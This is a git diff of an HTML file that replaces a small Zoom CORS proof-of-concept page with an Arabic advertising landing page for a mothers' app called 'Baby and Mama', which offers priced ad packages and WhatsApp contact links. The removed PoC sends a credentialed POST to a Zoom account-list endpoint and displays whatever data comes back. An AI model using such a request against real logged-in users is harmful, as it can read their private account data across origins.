@@ -1,81 +1,908 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Zoom CORS PoC - Multi Account List</title>
-    <style>
-        body { 
-            font-family: Arial, sans-serif; 
-            text-align: center; 
-            padding: 50px; 
-            background: #f8f9fa; 
-            color: #333;
-        }
-        button { 
-            padding: 15px 40px; 
-            font-size: 18px; 
-            background: #0d6efd; 
-            color: white; 
-            border: none; 
-            border-radius: 8px; 
-            cursor: pointer; 
-            margin: 20px;
-        }
-        button:hover { background: #0b5ed7; }
-        pre { 
-            background: #1e1e1e; 
-            color: #00ff00; 
-            padding: 20px; 
-            text-align: left; 
-            margin: 30px auto; 
-            max-width: 900px; 
-            border-radius: 10px; 
-            white-space: pre-wrap;
-            font-size: 14px;
-        }
-        .success { color: #00ff00; }
-        .error { color: #ff4444; }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>اعلن معنا - تطبيق بيبي وماما</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;800&display=swap" rel="stylesheet">
+<link href="https://cdn.jsdelivr.net/npm/flag-icons@7.2.3/css/flag-icons.min.css" rel="stylesheet">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  :root {
+    --rose:     #e8637a;
+    --rose-lt:  #f7cdd4;
+    --rose-xlt: #fdf0f2;
+    --cream:    #fff8f5;
+    --blush:    #fde8ec;
+    --gold:     #c9956a;
+    --gold-lt:  #f5e6d8;
+    --text:     #2d1a20;
+    --muted:    #8a6070;
+    --white:    #ffffff;
+    --radius:   18px;
+    --shadow:   0 8px 32px rgba(232,99,122,.12);
+  }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    font-family: 'Tajawal', sans-serif;
+    background: var(--cream);
+    color: var(--text);
+    font-size: 17px;
+    line-height: 1.7;
+    overflow-x: hidden;
+  }
+
+  /* ── HERO ── */
+  .hero {
+    position: relative;
+    min-height: 520px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    text-align: center;
+    padding: 80px 24px 120px;
+    overflow: hidden;
+    background: linear-gradient(160deg, #fde8ec 0%, #fff0f4 45%, #fdf0e6 100%);
+  }
+
+  .hero-blob {
+    position: absolute;
+    border-radius: 50%;
+    filter: blur(60px);
+    animation: drift 8s ease-in-out infinite alternate;
+    pointer-events: none;
+  }
+  .blob-1 { width:420px; height:420px; background:rgba(232,99,122,.18); top:-80px; right:-100px; animation-duration:9s; }
+  .blob-2 { width:300px; height:300px; background:rgba(201,149,106,.14); bottom:-60px; left:-60px; animation-duration:11s; animation-delay:-3s; }
+  .blob-3 { width:200px; height:200px; background:rgba(232,99,122,.1); top:50%; left:40%; animation-duration:7s; animation-delay:-5s; }
+
+  @keyframes drift {
+    from { transform: translate(0,0) scale(1); }
+    to   { transform: translate(30px,20px) scale(1.08); }
+  }
+
+  .hero-inner { position: relative; z-index: 2; }
+
+  .badge {
+    display: inline-block;
+    background: var(--white);
+    color: var(--rose);
+    font-size: 13px;
+    font-weight: 700;
+    letter-spacing: .06em;
+    padding: 6px 20px;
+    border-radius: 50px;
+    border: 1.5px solid var(--rose-lt);
+    margin-bottom: 24px;
+    box-shadow: 0 2px 12px rgba(232,99,122,.15);
+    animation: fadeUp .6s ease both;
+  }
+
+  .hero h1 {
+    font-size: clamp(32px, 6vw, 58px);
+    font-weight: 800;
+    color: var(--text);
+    line-height: 1.25;
+    margin-bottom: 20px;
+    animation: fadeUp .7s .1s ease both;
+  }
+  .hero h1 em { font-style: normal; color: var(--rose); }
+
+  .hero-sub {
+    font-size: 19px;
+    font-weight: 400;
+    color: var(--muted);
+    max-width: 560px;
+    margin: 0 auto 32px;
+    animation: fadeUp .7s .2s ease both;
+  }
+
+  .hero-countries {
+    display: inline-flex;
+    gap: 10px;
+    flex-wrap: wrap;
+    justify-content: center;
+    animation: fadeUp .7s .3s ease both;
+  }
+  .country-pill {
+    background: var(--white);
+    border: 1px solid var(--rose-lt);
+    border-radius: 50px;
+    padding: 6px 16px;
+    font-size: 14px;
+    font-weight: 500;
+    color: var(--muted);
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+  }
+  .country-pill .fi {
+    width: 20px;
+    height: 15px;
+    border-radius: 3px;
+    box-shadow: 0 1px 3px rgba(0,0,0,.15);
+    flex-shrink: 0;
+  }
+
+  /* wave divider */
+  .wave { display: block; width: 100%; height: 70px; margin-top: -2px; }
+
+  /* ── STATS ── */
+  .section { padding: 60px 24px; }
+  .section-center { text-align: center; }
+
+  .section-label {
+    font-size: 12px;
+    font-weight: 700;
+    letter-spacing: .12em;
+    color: var(--rose);
+    text-transform: uppercase;
+    margin-bottom: 10px;
+    opacity: 0;
+    animation: fadeUp .6s ease forwards;
+  }
+  .section-title {
+    font-size: clamp(24px, 4vw, 38px);
+    font-weight: 800;
+    color: var(--text);
+    margin-bottom: 50px;
+    opacity: 0;
+    animation: fadeUp .6s .1s ease forwards;
+  }
+
+  .stats-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+    gap: 20px;
+    max-width: 900px;
+    margin: 0 auto;
+  }
+
+  .stat-card {
+    background: var(--white);
+    border-radius: var(--radius);
+    padding: 32px 20px;
+    text-align: center;
+    border: 1px solid var(--rose-xlt);
+    box-shadow: var(--shadow);
+    transition: transform .3s ease, box-shadow .3s ease;
+  }
+  .stat-card:hover {
+    transform: translateY(-6px);
+    box-shadow: 0 16px 48px rgba(232,99,122,.18);
+  }
+
+  .stat-icon {
+    font-size: 28px;
+    margin-bottom: 10px;
+    display: block;
+  }
+  .stat-num {
+    font-size: 38px;
+    font-weight: 800;
+    color: var(--rose);
+    line-height: 1;
+    margin-bottom: 6px;
+    display: block;
+  }
+  .stat-label {
+    font-size: 14px;
+    color: var(--muted);
+    font-weight: 500;
+  }
+
+  /* ── PACKAGES ── */
+  .packages-bg { background: linear-gradient(180deg, var(--cream) 0%, var(--blush) 100%); }
+
+  .packages-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+    gap: 24px;
+    max-width: 1100px;
+    margin: 0 auto;
+  }
+
+  .pkg-card {
+    background: var(--white);
+    border-radius: 22px;
+    padding: 36px 28px;
+    border: 1.5px solid var(--rose-xlt);
+    box-shadow: var(--shadow);
+    display: flex;
+    flex-direction: column;
+    gap: 20px;
+    position: relative;
+    transition: box-shadow .35s ease;
+  }
+  .pkg-card:hover {
+    box-shadow: 0 20px 56px rgba(232,99,122,.22);
+  }
+
+  .pkg-card.featured {
+    border: 2px solid var(--rose);
+    background: linear-gradient(145deg, #fff5f7 0%, var(--white) 100%);
+  }
+
+  .hot-badge {
+    position: absolute;
+    top: -14px;
+    right: 50%;
+    transform: translateX(50%);
+    background: linear-gradient(90deg, var(--rose), #f4859b);
+    color: #fff;
+    font-size: 12px;
+    font-weight: 700;
+    padding: 5px 18px;
+    border-radius: 50px;
+    letter-spacing: .04em;
+    box-shadow: 0 4px 16px rgba(232,99,122,.4);
+  }
+
+  .pkg-name {
+    font-size: 20px;
+    font-weight: 700;
+    color: var(--text);
+  }
+
+  .pkg-price {
+    font-size: 52px;
+    font-weight: 800;
+    color: var(--rose);
+    line-height: 1;
+  }
+  .pkg-price span {
+    font-size: 20px;
+    font-weight: 500;
+    color: var(--muted);
+    margin-right: 4px;
+  }
+
+  .pkg-features {
+    list-style: none;
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+    flex: 1;
+  }
+  .pkg-features li {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    font-size: 15px;
+    color: var(--text);
+    font-weight: 400;
+  }
+  .pkg-features li::before {
+    content: '';
+    width: 20px;
+    height: 20px;
+    min-width: 20px;
+    border-radius: 50%;
+    background: var(--blush);
+    background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 20 20' fill='%23e8637a'%3E%3Cpath fill-rule='evenodd' d='M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z' clip-rule='evenodd'/%3E%3C/svg%3E");
+    background-size: 12px;
+    background-repeat: no-repeat;
+    background-position: center;
+    display: inline-block;
+    flex-shrink: 0;
+  }
+
+  .pkg-btn {
+    display: block;
+    text-align: center;
+    padding: 14px 24px;
+    border-radius: 14px;
+    font-family: 'Tajawal', sans-serif;
+    font-size: 16px;
+    font-weight: 700;
+    border: none;
+    cursor: pointer;
+    transition: transform .2s ease, box-shadow .2s ease, background .2s ease;
+    text-decoration: none;
+  }
+  .pkg-btn-outline {
+    background: var(--rose-xlt);
+    color: var(--rose);
+    border: 1.5px solid var(--rose-lt);
+  }
+  .pkg-btn-outline:hover {
+    background: var(--blush);
+    transform: scale(1.03);
+  }
+  .pkg-btn-solid {
+    background: linear-gradient(135deg, var(--rose), #f4859b);
+    color: #fff;
+    box-shadow: 0 6px 24px rgba(232,99,122,.35);
+  }
+  .pkg-btn-solid:hover {
+    transform: scale(1.04);
+    box-shadow: 0 10px 32px rgba(232,99,122,.45);
+  }
+
+  /* ── VALUE STRIP ── */
+  .value-strip {
+    background: linear-gradient(135deg, var(--rose) 0%, #f4859b 100%);
+    padding: 60px 24px;
+    text-align: center;
+    color: #fff;
+    position: relative;
+    overflow: hidden;
+  }
+  .value-strip::before {
+    content: '';
+    position: absolute;
+    width: 600px; height: 600px;
+    border-radius: 50%;
+    background: rgba(255,255,255,.06);
+    top: -200px; left: -100px;
+    pointer-events: none;
+  }
+  .value-strip::after {
+    content: '';
+    position: absolute;
+    width: 400px; height: 400px;
+    border-radius: 50%;
+    background: rgba(255,255,255,.05);
+    bottom: -150px; right: -80px;
+    pointer-events: none;
+  }
+  .value-strip h2 {
+    font-size: clamp(22px, 4vw, 36px);
+    font-weight: 800;
+    margin-bottom: 14px;
+    position: relative;
+    z-index: 1;
+  }
+  .value-strip p {
+    font-size: 17px;
+    opacity: .9;
+    max-width: 600px;
+    margin: 0 auto;
+    position: relative;
+    z-index: 1;
+    font-weight: 400;
+  }
+
+  /* ── CTA LINKS ── */
+  .cta-section { padding: 70px 24px; text-align: center; }
+  .cta-links { display: flex; gap: 16px; justify-content: center; flex-wrap: wrap; margin-top: 32px; }
+
+  .cta-btn {
+    display: inline-flex;
+    align-items: center;
+    gap: 10px;
+    padding: 16px 32px;
+    border-radius: 16px;
+    font-family: 'Tajawal', sans-serif;
+    font-size: 17px;
+    font-weight: 700;
+    text-decoration: none;
+    transition: transform .25s ease, box-shadow .25s ease;
+  }
+  .cta-btn-primary {
+    background: linear-gradient(135deg, var(--rose), #f4859b);
+    color: #fff;
+    box-shadow: 0 8px 28px rgba(232,99,122,.35);
+  }
+  .cta-btn-primary:hover { transform: translateY(-3px); box-shadow: 0 14px 40px rgba(232,99,122,.45); }
+
+  .cta-btn-secondary {
+    background: var(--gold-lt);
+    color: var(--gold);
+    border: 1.5px solid rgba(201,149,106,.3);
+  }
+  .cta-btn-secondary:hover { transform: translateY(-3px); box-shadow: 0 8px 24px rgba(201,149,106,.2); }
+
+  /* ── FOOTER ── */
+  footer {
+    background: var(--text);
+    color: rgba(255,255,255,.6);
+    text-align: center;
+    padding: 32px 24px;
+    font-size: 15px;
+    font-weight: 300;
+  }
+  footer strong { color: #fff; font-weight: 700; }
+
+  /* ── SCROLL PROGRESS BAR ── */
+  #progress-bar {
+    position: fixed;
+    top: 0; left: 0;
+    height: 3px;
+    width: 0%;
+    background: linear-gradient(90deg, var(--rose), var(--gold));
+    z-index: 99999;
+    transition: width .08s linear;
+    border-radius: 0 3px 3px 0;
+  }
+
+  /* ── SCROLL REVEAL ── */
+  .reveal {
+    opacity: 0;
+    transform: translateY(36px);
+    transition: opacity .7s cubic-bezier(.22,1,.36,1), transform .7s cubic-bezier(.22,1,.36,1);
+  }
+  .reveal.from-left  { transform: translateX(-40px); }
+  .reveal.from-right { transform: translateX(40px); }
+  .reveal.scale-in   { transform: scale(.92); }
+  .reveal.visible {
+    opacity: 1;
+    transform: translate(0) scale(1);
+  }
+  .reveal-delay-1 { transition-delay: .08s; }
+  .reveal-delay-2 { transition-delay: .16s; }
+  .reveal-delay-3 { transition-delay: .24s; }
+  .reveal-delay-4 { transition-delay: .32s; }
+
+  /* ── HERO ANIMATIONS ── */
+  @keyframes fadeUp {
+    from { opacity: 0; transform: translateY(24px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+
+  /* floating hearts/flowers */
+  .hearts { position: absolute; inset: 0; pointer-events: none; overflow: hidden; z-index: 1; }
+  .heart {
+    position: absolute;
+    font-size: 18px;
+    opacity: 0;
+    animation: floatUp linear infinite;
+  }
+  @keyframes floatUp {
+    0%   { opacity: 0; transform: translateY(0) scale(.8); }
+    10%  { opacity: .5; }
+    90%  { opacity: .2; }
+    100% { opacity: 0; transform: translateY(-340px) scale(1.2); }
+  }
+
+  /* ── SPARKLES ── */
+  .sparkle {
+    position: absolute;
+    pointer-events: none;
+    z-index: 3;
+    animation: sparkleAnim ease-out forwards;
+  }
+  @keyframes sparkleAnim {
+    0%   { opacity: 1; transform: scale(0) rotate(0deg); }
+    50%  { opacity: 1; transform: scale(1) rotate(180deg); }
+    100% { opacity: 0; transform: scale(.4) rotate(360deg) translateY(-30px); }
+  }
+
+  /* ── COUNTER ── */
+  .stat-num {
+    display: block;
+    transition: color .3s;
+  }
+  .stat-card:hover .stat-num { color: var(--gold); }
+
+  /* ── 3D TILT ── */
+  .pkg-card {
+    transform-style: preserve-3d;
+    will-change: transform;
+  }
+  .pkg-card .tilt-shine {
+    position: absolute;
+    inset: 0;
+    border-radius: 22px;
+    background: radial-gradient(circle at var(--mx,50%) var(--my,50%),
+      rgba(255,255,255,.18) 0%,
+      rgba(255,255,255,0) 60%);
+    pointer-events: none;
+    opacity: 0;
+    transition: opacity .3s;
+    z-index: 1;
+  }
+  .pkg-card:hover .tilt-shine { opacity: 1; }
+
+  /* ── RIPPLE ── */
+  .ripple-host { position: relative; overflow: hidden; }
+  .ripple-wave {
+    position: absolute;
+    border-radius: 50%;
+    background: rgba(255,255,255,.45);
+    transform: scale(0);
+    animation: rippleGo .55s ease-out forwards;
+    pointer-events: none;
+  }
+  @keyframes rippleGo {
+    to { transform: scale(4); opacity: 0; }
+  }
+
+  /* ── TYPEWRITER CURSOR ── */
+  .hero h1 em::after {
+    content: '|';
+    color: var(--rose);
+    animation: blink .8s step-end infinite;
+    margin-right: 2px;
+    font-weight: 300;
+  }
+  @keyframes blink {
+    0%,100% { opacity: 1; } 50% { opacity: 0; }
+  }
+  .cursor-done em::after { display: none; }
+
+  /* ── STAT ICON BOUNCE ── */
+  .stat-card:hover .stat-icon {
+    animation: iconBounce .4s ease;
+  }
+  @keyframes iconBounce {
+    0%   { transform: scale(1); }
+    40%  { transform: scale(1.4) rotate(-8deg); }
+    70%  { transform: scale(.9) rotate(4deg); }
+    100% { transform: scale(1); }
+  }
+
+  /* ── COUNTRY PILL HOVER ── */
+  .country-pill {
+    transition: transform .2s ease, box-shadow .2s ease;
+    cursor: default;
+  }
+  .country-pill:hover {
+    transform: translateY(-3px) scale(1.05);
+    box-shadow: 0 6px 18px rgba(232,99,122,.2);
+  }
+
+  /* ── WHATSAPP FLOAT ── */
+  .wa-float {
+    position: fixed;
+    left: 20px;
+    bottom: 30px;
+    z-index: 9999;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    text-decoration: none;
+    animation: fadeUp .8s .5s ease both;
+  }
+  .wa-bubble {
+    background: #25D366;
+    border-radius: 50px;
+    padding: 12px 18px 12px 16px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    box-shadow: 0 6px 24px rgba(37,211,102,.4);
+    transition: transform .25s ease, box-shadow .25s ease;
+    color: #fff;
+    font-size: 15px;
+    font-weight: 700;
+    font-family: 'Tajawal', sans-serif;
+    direction: ltr;
+    white-space: nowrap;
+  }
+  .wa-bubble:hover {
+    transform: translateY(-4px) scale(1.04);
+    box-shadow: 0 12px 36px rgba(37,211,102,.5);
+  }
+  .wa-bubble svg { width: 26px; height: 26px; flex-shrink: 0; }
+  .wa-pulse {
+    position: absolute;
+    inset: 0;
+    border-radius: 50px;
+    background: rgba(37,211,102,.35);
+    animation: pulse 2s ease-out infinite;
+    pointer-events: none;
+  }
+  @keyframes pulse {
+    0%   { transform: scale(1);   opacity: .7; }
+    100% { transform: scale(1.25); opacity: 0; }
+  }
+
+  @media (max-width: 600px) {
+    .packages-grid { grid-template-columns: 1fr; }
+    .pkg-card { padding: 28px 22px; }
+    .hero { padding: 60px 16px 100px; }
+    .wa-bubble span.wa-num { display: none; }
+    .wa-bubble { padding: 13px; border-radius: 50%; }
+  }
+</style>
 </head>
 <body>
-    <h1>Zoom CORS Misconfiguration PoC</h1>
-    <h2>Endpoint: /multi_account/list</h2>
-    <p><strong>تأكد أنك مسجل الدخول في Zoom في نفس المتصفح</strong></p>
-    
-    <button onclick="testZoomCORS()">اختبار الـ CORS الآن</button>
-    
-    <h3>النتيجة:</h3>
-    <pre id="result">اضغط على الزر للبدء...</pre>
 
-    <script>
-        function testZoomCORS() {
-            const resultDiv = document.getElementById('result');
-            resultDiv.textContent = 'جاري إرسال الطلب... يرجى الانتظار';
+<div id="progress-bar"></div>
 
-            fetch('https://us05web.zoom.us/multi_account/list', {
-                method: 'POST',
-                credentials: 'include'
-            })
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error(`HTTP Error: ${response.status}`);
-                }
-                return response.json();
-            })
-            .then(data => {
-                resultDiv.innerHTML = `<span class="success">✅ نجح!</span><br><br>` + 
-                                      JSON.stringify(data, null, 2);
-                console.log("Zoom CORS PoC Success:", data);
-            })
-            .catch(error => {
-                resultDiv.innerHTML = `<span class="error">❌ فشل:</span> ${error.message}<br><br>تأكد من:<br>
-                - تسجيل الدخول في Zoom<br>
-                - فتح الصفحة من رابط HTTPS<br>
-                - جرب مرة أخرى`;
-                console.error("Error:", error);
-            });
-        }
-    </script>
+<!-- ── HERO ── -->
+<header class="hero">
+  <div class="hero-blob blob-1"></div>
+  <div class="hero-blob blob-2"></div>
+  <div class="hero-blob blob-3"></div>
+  <div id="sparkle-container" aria-hidden="true"></div>
+
+  <!-- floating hearts -->
+  <div class="hearts" aria-hidden="true">
+    <span class="heart" style="right:10%;animation-duration:6s;animation-delay:0s">🌸</span>
+    <span class="heart" style="right:25%;animation-duration:8s;animation-delay:1.5s">💕</span>
+    <span class="heart" style="right:50%;animation-duration:7s;animation-delay:3s">🌷</span>
+    <span class="heart" style="right:70%;animation-duration:9s;animation-delay:.8s">💗</span>
+    <span class="heart" style="right:85%;animation-duration:6.5s;animation-delay:2s">🌸</span>
+  </div>
+
+  <div class="hero-inner">
+    <div class="badge">🤰 فرصتك للوصول لآلاف الأمهات</div>
+    <h1>اعلن في <em id="typed-text"></em><br>ووصّل منتجك لمن يبحث عنه</h1>
+    <p class="hero-sub">
+      مش مجرد إعلان… إحنا بنوصلك مباشرة لأمهات مهتمة فعلًا بالشراء
+    </p>
+    <div class="hero-countries">
+      <span class="country-pill"><span class="fi fi-eg"></span> مصر</span>
+      <span class="country-pill"><span class="fi fi-sa"></span> السعودية</span>
+      <span class="country-pill"><span class="fi fi-ly"></span> ليبيا</span>
+      <span class="country-pill"><span class="fi fi-dz"></span> الجزائر</span>
+      <span class="country-pill"><span class="fi fi-iq"></span> العراق</span>
+    </div>
+  </div>
+</header>
+
+<svg class="wave" viewBox="0 0 1440 70" xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="none">
+  <path d="M0,40 C360,80 1080,0 1440,40 L1440,70 L0,70 Z" fill="#fff8f5"/>
+</svg>
+
+<!-- ── STATS ── -->
+<section class="section section-center">
+  <p class="section-label reveal">أرقامنا تتكلم</p>
+  <h2 class="section-title reveal reveal-delay-1">جمهور حقيقي ومتفاعل</h2>
+  <div class="stats-grid">
+    <div class="stat-card reveal reveal-delay-1">
+      <span class="stat-icon">👩‍👧</span>
+      <span class="stat-num" data-target="13000" data-suffix="K+">13K+</span>
+      <span class="stat-label">مستخدمة نشطة</span>
+    </div>
+    <div class="stat-card reveal reveal-delay-2">
+      <span class="stat-icon">💬</span>
+      <span class="stat-num" data-target="38000" data-suffix="K+">38K+</span>
+      <span class="stat-label">رسالة داخل التطبيق</span>
+    </div>
+    <div class="stat-card reveal reveal-delay-3">
+      <span class="stat-icon">🎵</span>
+      <span class="stat-num" data-target="17000" data-suffix="K">17K</span>
+      <span class="stat-label">متابع على TikTok</span>
+    </div>
+    <div class="stat-card reveal reveal-delay-4">
+      <span class="stat-icon">👁️</span>
+      <span class="stat-num" data-target="100000" data-suffix="K+">100K+</span>
+      <span class="stat-label">مشاهدة شهرياً</span>
+    </div>
+  </div>
+</section>
+
+<!-- ── VALUE STRIP ── -->
+<div class="value-strip">
+  <h2 class="reveal scale-in">🎯 جمهور مستهدف بدقة — مش جمهور عشوائي</h2>
+  <p class="reveal reveal-delay-1">
+    كل أمّ في التطبيق بتشوف إعلانك في سياق طبيعي وهي بتتفاعل مع محتوى يخصّها،
+    وده بيخلي معدل التحويل أعلى بكتير من الإعلانات التقليدية.
+  </p>
+</div>
+
+<!-- ── PACKAGES ── -->
+<section class="section section-center packages-bg">
+  <p class="section-label reveal">باقات الإعلان</p>
+  <h2 class="section-title reveal reveal-delay-1">اختار الباقة المناسبة لك</h2>
+
+  <div class="packages-grid">
+
+    <!-- Starter -->
+    <div class="pkg-card reveal reveal-delay-1">
+      <div class="tilt-shine"></div>
+      <div>
+        <div class="pkg-name">🚀 Starter Launch</div>
+      </div>
+      <div class="pkg-price"><span>$</span>15</div>
+      <ul class="pkg-features">
+        <li>ستوري داخل التطبيق (24 ساعة)</li>
+        <li>ستوري على TikTok (24 ساعة)</li>
+        <li>ظهور لجمهور مستهدف</li>
+      </ul>
+      <a href="https://wa.me/201092732678?text=مرحبا،%20أريد%20الاستفسار%20عن%20باقة%20Starter%20Launch" target="_blank" class="pkg-btn pkg-btn-outline ripple-host">ابدأ الآن</a>
+    </div>
+
+    <!-- Basic -->
+    <div class="pkg-card reveal reveal-delay-2">
+      <div class="tilt-shine"></div>
+      <div>
+        <div class="pkg-name">✨ Basic</div>
+      </div>
+      <div class="pkg-price"><span>$</span>25</div>
+      <ul class="pkg-features">
+        <li>ستوري على TikTok (24 ساعة)</li>
+        <li>بوست مثبّت داخل التطبيق (24 ساعة)</li>
+      </ul>
+      <a href="https://wa.me/201092732678?text=مرحبا،%20أريد%20الاستفسار%20عن%20باقة%20Basic" target="_blank" class="pkg-btn pkg-btn-outline ripple-host">ابدأ الآن</a>
+    </div>
+
+    <!-- Growth FEATURED -->
+    <div class="pkg-card featured reveal reveal-delay-3">
+      <div class="tilt-shine"></div>
+      <div class="hot-badge">🔥 الأكثر طلبًا</div>
+      <div>
+        <div class="pkg-name">💎 Growth</div>
+      </div>
+      <div class="pkg-price"><span>$</span>45</div>
+      <ul class="pkg-features">
+        <li>فيديو على TikTok</li>
+        <li>ستوري داخل التطبيق</li>
+        <li>وصول + ثقة + تفاعل</li>
+      </ul>
+      <a href="https://wa.me/201092732678?text=مرحبا،%20أريد%20الاستفسار%20عن%20باقة%20Growth" target="_blank" class="pkg-btn pkg-btn-solid ripple-host">احجز الآن</a>
+    </div>
+
+    <!-- Premium -->
+    <div class="pkg-card reveal reveal-delay-4">
+      <div class="tilt-shine"></div>
+      <div>
+        <div class="pkg-name">👑 Premium</div>
+      </div>
+      <div class="pkg-price"><span>$</span>90</div>
+      <ul class="pkg-features">
+        <li>فيديو احترافي كامل</li>
+        <li>2 ستوري + بوست مثبّت</li>
+        <li>أقصى وصول ممكن</li>
+      </ul>
+      <a href="https://wa.me/201092732678?text=مرحبا،%20أريد%20الاستفسار%20عن%20باقة%20Premium" target="_blank" class="pkg-btn pkg-btn-outline ripple-host">احجز الآن</a>
+    </div>
+
+  </div>
+</section>
+
+<!-- ── CTA ── -->
+<section class="cta-section">
+  <p class="section-label reveal">تواصل معنا</p>
+  <h2 class="section-title reveal reveal-delay-1">مستعد تبدأ؟</h2>
+  <p class="reveal reveal-delay-2" style="color:var(--muted); max-width:480px; margin:0 auto;">
+    تحقق بنفسك من حجم التفاعل وابدأ مع الباقة اللي تناسبك
+  </p>
+  <div class="cta-links reveal reveal-delay-3">
+    <a href="https://play.google.com/store/apps/details?id=com.babyandmama.app"
+       target="_blank" class="cta-btn cta-btn-primary ripple-host">
+      📲 تحميل التطبيق
+    </a>
+    <a href="https://www.tiktok.com/@hnfr9"
+       target="_blank" class="cta-btn cta-btn-secondary ripple-host">
+      🎥 مشاهدة TikTok
+    </a>
+  </div>
+</section>
+
+<!-- ── FOOTER ── -->
+<footer>
+  <p>© 2025 تطبيق بيبي وماما — جميع الحقوق محفوظة</p>
+</footer>
+
+<!-- ── FLOATING WHATSAPP ── -->
+<a href="https://wa.me/201092732678?text=مرحبا،%20أريد%20الاستفسار%20عن%20الإعلان%20في%20تطبيق%20بيبي%20وماما" target="_blank" class="wa-float" aria-label="تواصل عبر واتساب">
+  <div class="wa-pulse"></div>
+  <div class="wa-bubble">
+    <svg viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+      <path d="M16 2C8.268 2 2 8.268 2 16c0 2.434.651 4.716 1.787 6.688L2 30l7.5-1.762A13.94 13.94 0 0016 30c7.732 0 14-6.268 14-14S23.732 2 16 2z" fill="#fff" fill-opacity=".2"/>
+      <path d="M16 3.5C9.096 3.5 3.5 9.096 3.5 16c0 2.29.609 4.44 1.674 6.296L3.5 28.5l6.37-1.648A12.45 12.45 0 0016 28.5c6.904 0 12.5-5.596 12.5-12.5S22.904 3.5 16 3.5zm6.5 17.2c-.27.757-1.587 1.445-2.178 1.536-.557.086-1.26.122-2.034-.128-.468-.15-1.07-.35-1.837-.686-3.233-1.394-5.344-4.65-5.504-4.868-.16-.218-1.304-1.737-1.304-3.31 0-1.573.824-2.348 1.116-2.667.292-.32.637-.4.85-.4.21 0 .424.002.61.01.195.01.457-.074.715.546.265.636.9 2.21.978 2.37.079.16.131.347.026.558-.104.21-.157.34-.31.523-.153.184-.322.41-.459.55-.153.156-.312.325-.134.638.178.313.79 1.303 1.696 2.11 1.165 1.04 2.148 1.361 2.461 1.52.312.16.494.134.676-.08.183-.214.78-.91 1.988-.91.116 0 .228.01.334.03.46.084 1.46.615 1.713 1.359.253.744-.017 1.64-.287 2.398z" fill="#fff"/>
+    </svg>
+    <span class="wa-num">01092732678</span>
+  </div>
+</a>
+
+<script>
+/* ── 1. SCROLL PROGRESS BAR ── */
+const bar = document.getElementById('progress-bar');
+window.addEventListener('scroll', () => {
+  const pct = window.scrollY / (document.body.scrollHeight - window.innerHeight) * 100;
+  bar.style.width = Math.min(pct, 100) + '%';
+}, { passive: true });
+
+/* ── 2. SCROLL REVEAL via IntersectionObserver ── */
+const revealEls = document.querySelectorAll('.reveal');
+const observer = new IntersectionObserver((entries) => {
+  entries.forEach(e => {
+    if (e.isIntersecting) {
+      e.target.classList.add('visible');
+      observer.unobserve(e.target);
+    }
+  });
+}, { threshold: 0.12 });
+revealEls.forEach(el => observer.observe(el));
+
+/* ── 3. COUNTER ANIMATION ── */
+function animateCounter(el) {
+  const target = parseInt(el.dataset.target);
+  const suffix = el.dataset.suffix || '';
+  const duration = 1800;
+  const step = 16;
+  const steps = duration / step;
+  let current = 0;
+  const inc = target / steps;
+  const timer = setInterval(() => {
+    current += inc;
+    if (current >= target) {
+      current = target;
+      clearInterval(timer);
+    }
+    const display = current >= 1000
+      ? Math.round(current / 1000) + suffix
+      : Math.round(current) + suffix;
+    el.textContent = display;
+  }, step);
+}
+
+const counterObserver = new IntersectionObserver((entries) => {
+  entries.forEach(e => {
+    if (e.isIntersecting && e.target.dataset.target) {
+      animateCounter(e.target);
+      counterObserver.unobserve(e.target);
+    }
+  });
+}, { threshold: 0.4 });
+document.querySelectorAll('.stat-num[data-target]').forEach(el => counterObserver.observe(el));
+
+/* ── 4. 3D TILT on pkg cards ── */
+document.querySelectorAll('.pkg-card').forEach(card => {
+  card.addEventListener('mousemove', e => {
+    const r = card.getBoundingClientRect();
+    const x = (e.clientX - r.left) / r.width  - 0.5;
+    const y = (e.clientY - r.top)  / r.height - 0.5;
+    card.style.transform = `perspective(700px) rotateY(${x * 10}deg) rotateX(${-y * 10}deg) translateY(-6px)`;
+    card.style.setProperty('--mx', (x + 0.5) * 100 + '%');
+    card.style.setProperty('--my', (y + 0.5) * 100 + '%');
+  });
+  card.addEventListener('mouseleave', () => {
+    card.style.transform = '';
+  });
+});
+
+/* ── 5. RIPPLE EFFECT on buttons ── */
+document.querySelectorAll('.ripple-host').forEach(btn => {
+  btn.addEventListener('click', e => {
+    const r = btn.getBoundingClientRect();
+    const size = Math.max(r.width, r.height);
+    const wave = document.createElement('span');
+    wave.className = 'ripple-wave';
+    wave.style.cssText = `width:${size}px;height:${size}px;left:${e.clientX-r.left-size/2}px;top:${e.clientY-r.top-size/2}px`;
+    btn.appendChild(wave);
+    setTimeout(() => wave.remove(), 600);
+  });
+});
+
+/* ── 6. SPARKLES in hero ── */
+const heroEl = document.querySelector('.hero');
+const sparkleCont = document.getElementById('sparkle-container');
+const sparkleShapes = ['✦','✧','⋆','✶','❋'];
+function createSparkle() {
+  const s = document.createElement('span');
+  s.className = 'sparkle';
+  s.textContent = sparkleShapes[Math.floor(Math.random() * sparkleShapes.length)];
